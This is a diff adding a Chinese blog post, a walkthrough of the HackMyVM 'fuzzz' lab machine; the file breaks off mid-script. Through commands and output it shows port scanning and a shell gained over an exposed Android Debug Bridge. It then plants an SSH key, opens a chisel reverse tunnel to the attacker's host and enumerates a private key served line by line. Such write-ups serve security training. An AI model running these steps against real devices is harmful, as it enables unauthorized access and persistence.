@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="这个靶机的难度虽然是low-easy，但是很多内容我没有想到，好久没也做靶机了，这是看群主视频的懦夫模式做的T_T记录一下懦夫模式之后的复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-fuzzz复现">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/28301.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="这个靶机的难度虽然是low-easy，但是很多内容我没有想到，好久没也做靶机了，这是看群主视频的懦夫模式做的T_T记录一下懦夫模式之后的复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-09-02T14:43:37.000Z">
+<meta property="article:modified_time" content="2025-09-08T11:47:10.026Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="HMV">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/28301.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HMV-fuzzz复现 | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">15</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">15</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">82</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/28301.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HMV-fuzzz复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-09-02 22:43:37" itemprop="dateCreated datePublished" datetime="2025-09-02T22:43:37+08:00">2025-09-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-09-08 19:47:10" itemprop="dateModified" datetime="2025-09-08T19:47:10+08:00">2025-09-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/hmv/" itemprop="url" rel="index"><span itemprop="name">hmv</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/68b7067558cb8da5c8735b99.png" class="img-topic">
+        </div>
+      
+      
+        <p>这个靶机的难度虽然是low-easy，但是很多内容我没有想到，好久没也做靶机了，这是看群主视频的懦夫模式做的T_T<br>记录一下懦夫模式之后的复现</p>
+<span id="more"></span>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap 192.168.250.67 -Pn</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>9-<span class="number">02</span> <span class="number">23</span>:<span class="number">12</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">250.67</span>)</span><br><span class="line">Host is up (<span class="number">0.00093</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>   open  ssh</span><br><span class="line"><span class="number">5555</span><span class="symbol">/tcp</span> open  freeciv</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:B8:<span class="number">32</span>:<span class="number">24</span> (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">1.87</span> seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap 192.168.250.67 -sV -p 5555</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>9-<span class="number">02</span> <span class="number">23</span>:<span class="number">13</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">250.67</span>)</span><br><span class="line">Host is up (<span class="number">0.0018</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">5555</span><span class="symbol">/tcp</span> open  adb     Android Debug Bridge (token auth required)</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:B8:<span class="number">32</span>:<span class="number">24</span> (VMware)</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Android; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.17</span> seconds</span><br></pre></td></tr></table></figure></div>
+<p>这里扫出了一个平时不常见的端口5555 用-sV扫描版本 得到是adb服务<br>问了一下gpt这个adb是什么<br>Android 的远程管理工具，只要设备启用了 USB 调试就可以连接</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>用adb connect 连接 然后用adb shell 可以开一个shell 但是这个shell不稳定还会自己断连，所以把自己公钥写进去然后ssh连接</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/tmp]</span><br><span class="line">└─# adb connect 192.168.250.67:5555</span><br><span class="line">* daemon <span class="keyword">not</span> running; starting now at tcp:5037</span><br><span class="line">* daemon started successfully</span><br><span class="line">connected <span class="keyword">to</span> 192.168.250.67:5555</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/tmp]</span><br><span class="line">└─# adb shell</span><br><span class="line">/ $ id</span><br><span class="line"><span class="attribute">uid</span>=1000(runner) <span class="attribute">gid</span>=1000(runner) <span class="attribute">groups</span>=1000(runner)</span><br></pre></td></tr></table></figure></div>
+
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──<span class="params">(root㉿kali)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># adb shell</span></span><br><span class="line">/ $ <span class="keyword">cd</span></span><br><span class="line">~ $ <span class="keyword">ls</span></span><br><span class="line">~ $ <span class="keyword">ls</span> -al</span><br><span class="line">total 8</span><br><span class="line">drwx<span class="params">------</span>    2 runner   runner        4096 May 19 09<span class="function">:08</span> .</span><br><span class="line">drwxr-xr-x    4 root     root          4096 May 19 10<span class="function">:02</span> <span class="string">..</span></span><br><span class="line">lrwxrwxrwx    1 root     runner           9 May 19 09<span class="function">:08</span> <span class="string">.ash_history</span> -&gt; <span class="string">/dev/null</span></span><br><span class="line">~ $ <span class="keyword">cd</span> <span class="string">/home</span></span><br><span class="line"><span class="string">/home</span> $ <span class="keyword">ls</span></span><br><span class="line">asahi   runner</span><br><span class="line"><span class="string">/home</span> $ <span class="keyword">cd</span> runner</span><br><span class="line">~ $ <span class="keyword">ls</span> -al</span><br><span class="line">total 8</span><br><span class="line">drwx<span class="params">------</span>    2 runner   runner        4096 May 19 09<span class="function">:08</span> .</span><br><span class="line">drwxr-xr-x    4 root     root          4096 May 19 10<span class="function">:02</span> <span class="string">..</span></span><br><span class="line">lrwxrwxrwx    1 root     runner           9 May 19 09<span class="function">:08</span> <span class="string">.ash_history</span> -&gt; <span class="string">/dev/null</span></span><br><span class="line">~ $ mkdir <span class="string">.ssh</span></span><br><span class="line">~ $ <span class="keyword">cd</span> <span class="string">.ssh</span></span><br><span class="line"></span><br><span class="line">~<span class="string">/.ssh</span> $ exit           </span><br></pre></td></tr></table></figure>
+<p>把公钥写到.ssh中的authorized_keys</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/tmp]</span><br><span class="line">└─# ssh runner@<span class="number">192.168</span>.<span class="number">250.67</span></span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.250.67 (192.168.250.67)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:y+<span class="number">2</span>KKHDaMy8FmNZpu0PMG4PJ+b1w5rQQScGZYvJj4L8.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;192.168.250.67&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">fuzzz:</span>~$ id</span><br><span class="line">uid=<span class="number">1000</span>(runner) gid=<span class="number">1000</span>(runner) groups=<span class="number">1000</span>(runner)</span><br></pre></td></tr></table></figure></div>
+<p>然后这个runner用户目录下没有东西，sudo -l 也需要密码 上传pspy64也没有什么定时任务<br>下一步用netstat -lntup 看看后台有没有运行什么服务 这里发现是有的 有一个80端口 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fuzzz</span>:~$ netstat -lntup</span><br><span class="line"><span class="attribute">netstat</span>: showing only processes with your user ID</span><br><span class="line"><span class="attribute">Active</span> Internet connections (only servers)</span><br><span class="line"><span class="attribute">Proto</span> Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line"><span class="attribute">tcp</span>        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0.0.1:80</span>            <span class="number">0.0.0.0</span>:*               LISTEN      -</span><br><span class="line"><span class="attribute">tcp</span>        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0.0.0:5555</span>            <span class="number">0.0.0.0</span>:*               LISTEN      <span class="number">4291</span>/python3</span><br><span class="line"><span class="attribute">tcp</span>        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0.0.0:22</span>              <span class="number">0.0.0.0</span>:*               LISTEN      -</span><br><span class="line"><span class="attribute">tcp</span>        <span class="number">0</span>      <span class="number">0</span> :::<span class="number">22</span>                   :::*                    LISTEN      -</span><br></pre></td></tr></table></figure></div>
+<p>下一步就是拉过来一个socat转发一下端口<br>这里不知道为什么我的静态编译的socat在这个shell里面不能运行，然后用chiel 这个还是很好用的<br><a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel/releases">https://github.com/jpillora/chisel/releases</a> 下载linux_adm64版本的</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># ./chisel server -p 1234 --reverse</span></span><br><span class="line"><span class="number">2025</span><span class="symbol">/09/08</span> <span class="number">17</span>:<span class="number">36</span>:<span class="number">05</span> <span class="params">server:</span> Reverse tunnelling enabled</span><br><span class="line"><span class="number">2025</span><span class="symbol">/09/08</span> <span class="number">17</span>:<span class="number">36</span>:<span class="number">05</span> <span class="params">server:</span> Fingerprint sJnrFzp0p2DlaaIHEP3ZOubOvfaXbjMBw6IMNCMaKOc<span class="operator">=</span></span><br><span class="line"><span class="number">2025</span><span class="symbol">/09/08</span> <span class="number">17</span>:<span class="number">36</span>:<span class="number">05</span> <span class="params">server:</span> Listening on http:<span class="operator">//</span><span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">1234</span></span><br><span class="line"></span><br><span class="line">fuzzz:~$ chmod <span class="operator">+</span>x chisel</span><br><span class="line">fuzzz:~$ <span class="symbol">./chisel</span> client <span class="number">192.168</span>.<span class="number">250.196</span>:<span class="number">1234</span> R:<span class="number">8888</span>:<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">80</span></span><br></pre></td></tr></table></figure></div>
+<p>指令的意思是在kali上开启监听 反向连接 在1234端口开启服务<br>然后在靶机上运行客户端 连接到kali的1234端口 R代表远程模式 把靶机的80端口转发到kali的8888端口上面<br>用gobuster扫描发现有很多line 猜测后面还有lin3 line4等等</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/tmp]</span><br><span class="line"><span class="section">└─# gobuster dir  -u http://127.0.0.1:8888 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -x php,txt,html,jpg,png,xml,zip,js -r</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://127.0.0.1:8888</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt,html,jpg,png,xml,zip,js</span><br><span class="line">[+] Follow Redirect:         true</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/line                 (Status: 200) [Size: 0]</span><br><span class="line">/line2                (Status: 200) [Size: 0]</span><br><span class="line">/line1                (Status: 200) [Size: 0]</span><br><span class="line">Progress: 47956 / 1868796 (2.57%)^C</span><br><span class="line">[!] Keyboard interrupt detected, terminating.</span><br><span class="line"><span class="section">Progress: 47972 / 1868796 (2.57%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="section">Finished</span></span><br><span class="line"><span class="section">===============================================================</span></span><br></pre></td></tr></table></figure></div>
+<p>继续扫描line1的内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/tmp]</span><br><span class="line"><span class="section">└─# gobuster dir  -u http://127.0.0.1:8888/line1 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -x php,txt,html,jpg,png,xml,zip,js -r</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://127.0.0.1:8888/line1</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt,html,jpg,png,xml,zip,js</span><br><span class="line">[+] Follow Redirect:         true</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/b                    (Status: 200) [Size: 0]</span><br><span class="line">/b3                   (Status: 200) [Size: 0]</span><br><span class="line">Progress: 25930 / 1868796 (1.39%)^C</span><br><span class="line">[!] Keyboard interrupt detected, terminating.</span><br><span class="line"><span class="section">Progress: 25951 / 1868796 (1.39%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="section">Finished</span></span><br><span class="line"><span class="section">===============================================================</span></span><br></pre></td></tr></table></figure></div>
+<p>这里出现了b3 由于我是懦夫模式，知道了这个就是id_rsa的开头，以后要对这个感到敏感了<br>所以这个靶机就是把私钥内容放在目录里面了  每个line就是每行的内容<br>先写一个脚本看看有多少行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://127.0.0.1:8888&quot;</span></span><br><span class="line">max_line = <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_lines</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 开始检测总行数&quot;</span>)</span><br><span class="line"></span><br><span class="line">    line = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> line &lt; max_line:</span><br><span class="line">        url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/line<span class="subst">&#123;line&#125;</span>&quot;</span></span><br><span class="line">        response = requests.head(url,timeout=<span class="number">5</span>,allow_redirects=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+]发现新行数 line<span class="subst">&#123;line&#125;</span>&quot;</span>)</span><br><span class="line">            line += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> response.status_code == <span class="number">404</span>:</span><br><span class="line">            totle_line = line - <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;共发现行数<span class="subst">&#123;totle_line&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> totle_line</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;意外状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    find_lines()</span><br></pre></td></tr></table></figure></div>
+<p>运行之后知道一共有5行<br>然后再写个脚本获取每行的内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 